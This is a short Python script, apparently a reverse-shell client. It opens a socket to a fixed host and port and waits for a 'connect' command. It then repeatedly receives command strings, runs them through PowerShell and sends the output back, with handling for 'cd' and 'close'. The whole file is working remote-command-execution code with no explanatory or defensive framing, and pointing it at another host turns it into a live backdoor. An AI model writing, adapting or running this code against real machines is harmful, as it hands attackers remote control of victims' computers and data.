import  socket
import os
import subprocess


HOST = "127.0.0.1"
PORT = 6565




client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((HOST,PORT))



def connect():
    while 1:
        pwd = os.getcwd()
        client.send(pwd.encode('utf-8'))
        response = client.recv(40960)
        command = response.decode('utf-8')
        if command.split(" ")[0] == "cd":
            os.chdir(command.split(" ")[1])
        elif command == 'close':
            client.send(b"[*] Connection closed !!!")
            break
        stdout = subprocess.check_output(["powershell", "-Command",command])

        if stdout:
            client.send(stdout)
        else:
            client.send(b"\n")

while 1:
    command = client.recv(40960).decode("utf-8")
    match command:
            case "connect":
                connect()

client.close()



